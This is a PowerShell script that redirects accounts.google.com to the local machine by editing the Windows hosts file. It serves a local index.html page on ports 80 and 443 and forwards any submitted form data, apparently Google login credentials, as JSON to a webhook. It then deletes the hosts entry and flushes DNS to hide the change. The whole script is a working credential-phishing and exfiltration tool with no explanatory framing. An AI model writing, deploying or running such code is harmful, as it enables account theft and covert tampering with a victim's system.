$hostString = "127.0.0.1 accounts.google.com";
$isModified = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;

if ($null -eq $isModified ) {    
    Add-Content C:\Windows\System32\Drivers\etc\hosts ("`n"+$hostString);
    ipconfig /flushdns;
}

$url = 'http://127.0.0.1';
$hook="";
$pageCode = Get-Content "index.html" -Encoding UTF8 -Raw;
$http = New-Object System.Net.HttpListener;
$http.Prefixes.Add($url + ':80/');
$http.Prefixes.Add($url + ':443/');
$http.Start();

while ($http.IsListening) {
    $context = $http.GetContext();  
     
    if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {
        $buffer = [Text.Encoding]::UTF8.GetBytes($pageCode);
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();    
    }

    if ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/') {
        $data = @{
            content = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
        };
        
        $response = Invoke-RestMethod -ContentType 'Application/Json' -Uri $hook  -Method Post -Body ($data | ConvertTo-Json);

        (Get-Content C:\Windows\System32\Drivers\etc\hosts | Select-String -pattern $hostString -notmatch) | Set-Content C:\Windows\System32\Drivers\etc\hosts;
        ipconfig /flushdns;

        $buffer = [Text.Encoding]::UTF8.GetBytes("");
        $context.Response.Headers.Add("Content-Type","text/plain");
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.StatusCode = 200;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();

        $http.Stop();
    }

}